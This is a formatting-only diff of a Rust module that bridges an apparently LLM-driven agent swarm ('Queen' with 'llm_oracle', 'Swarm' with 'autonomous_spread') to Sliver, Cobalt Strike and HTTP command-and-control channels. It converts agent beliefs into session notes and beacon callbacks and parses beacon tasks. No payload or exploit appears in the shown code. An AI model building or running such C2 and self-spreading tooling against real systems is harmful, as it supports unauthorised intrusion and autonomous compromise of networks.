@@ -9,8 +9,8 @@
 
 use crate::ldc::{Message, Payload, Role, Value};
 use serde::{Deserialize, Serialize};
-use uuid::Uuid;
 use std::collections::HashMap;
+use uuid::Uuid;
 
 // ── Standard External C2 Message Format ──────────────────────────────────────
 
@@ -48,11 +48,19 @@ pub struct SliverBridge {
 
 impl SliverBridge {
     pub fn new(agent_id: Uuid, c2_endpoint: &str) -> Self {
-        Self { agent_id, c2_endpoint: c2_endpoint.to_string() }
+        Self {
+            agent_id,
+            c2_endpoint: c2_endpoint.to_string(),
+        }
     }
 
     /// Convert an LdC Belief to a Sliver session note
-    pub fn belief_to_sliver_note(belief: &Message, asset: &str, value: &Value, confidence: f32) -> HashMap<String, String> {
+    pub fn belief_to_sliver_note(
+        belief: &Message,
+        asset: &str,
+        value: &Value,
+        confidence: f32,
+    ) -> HashMap<String, String> {
         let mut note = HashMap::new();
         note.insert("type".into(), "swarm_belief".into());
         note.insert("agent_id".into(), belief.agent_id.to_string());
@@ -83,7 +91,8 @@ impl SliverBridge {
             success: true,
             output: format!("{:?}", msg.payload),
             beliefs: Vec::new(),
-        }).unwrap_or_default();
+        })
+        .unwrap_or_default();
         payload
     }
 }
@@ -104,7 +113,12 @@ impl CSBridge {
     }
 
     /// Convert LdC Belief to CS Beacon callback format
-    pub fn belief_to_beacon_callback(msg: &Message, asset: &str, value: &Value, confidence: f32) -> Vec<u8> {
+    pub fn belief_to_beacon_callback(
+        msg: &Message,
+        asset: &str,
+        value: &Value,
+        confidence: f32,
+    ) -> Vec<u8> {
         let mut buf = Vec::new();
 
         // CS callback type (0x21 = user-defined)
@@ -134,7 +148,9 @@ impl CSBridge {
 
     /// Parse a CS beacon task into an LdC Proposal
     pub fn beacon_task_to_proposal(task_data: &[u8]) -> Option<(Message, Uuid)> {
-        if task_data.is_empty() { return None; }
+        if task_data.is_empty() {
+            return None;
+        }
 
         let cmd_type = task_data[0];
         let cmd_str = match cmd_type {
@@ -184,7 +200,8 @@ impl HttpBridge {
                 Role::Queen => vec!["llm_oracle", "strategic_planning", "bridge"],
                 Role::Swarm => vec!["autonomous_spread"],
             },
-        })).unwrap_or_default()
+        }))
+        .unwrap_or_default()
     }
 
     /// Parse an HTTP C2 task into LdC messages
@@ -292,23 +309,48 @@ impl BridgeManager {
     /// Dispatch an LdC message to the appropriate C2 bridge
     pub fn dispatch_belief(&self, msg: &Message) -> Option<Vec<u8>> {
         match (&self.mode, &msg.payload) {
-            (BridgeMode::Sliver { .. }, Payload::Belief { asset, value, confidence }) => {
+            (
+                BridgeMode::Sliver { .. },
+                Payload::Belief {
+                    asset,
+                    value,
+                    confidence,
+                },
+            ) => {
                 let note = SliverBridge::belief_to_sliver_note(msg, asset, value, *confidence);
                 Some(serde_json::to_vec(&note).unwrap_or_default())
             }
-            (BridgeMode::CobaltStrike { .. }, Payload::Belief { asset, value, confidence }) => {
-                Some(CSBridge::belief_to_beacon_callback(msg, asset, value, *confidence))
-            }
-            (BridgeMode::Http { .. }, Payload::Belief { asset, value, confidence }) => {
-                Some(serde_json::to_vec(&serde_json::json!({
+            (
+                BridgeMode::CobaltStrike { .. },
+                Payload::Belief {
+                    asset,
+                    value,
+                    confidence,
+                },
+            ) => Some(CSBridge::belief_to_beacon_callback(
+                msg,
+                asset,
+                value,
+                *confidence,
+            )),
+            (
+                BridgeMode::Http { .. },
+                Payload::Belief {
+                    asset,
+                    value,
+                    confidence,
+                },
+            ) => Some(
+                serde_json::to_vec(&serde_json::json!({
                     "type": "belief",
                     "agent_id": msg.agent_id.to_string(),
                     "role": format!("{:?}", msg.agent_role),
                     "asset": asset,
                     "value": format!("{:?}", value),
                     "confidence": confidence,
-                })).unwrap_or_default())
-            }
+                }))
+                .unwrap_or_default(),
+            ),
             _ => None,
         }
     }
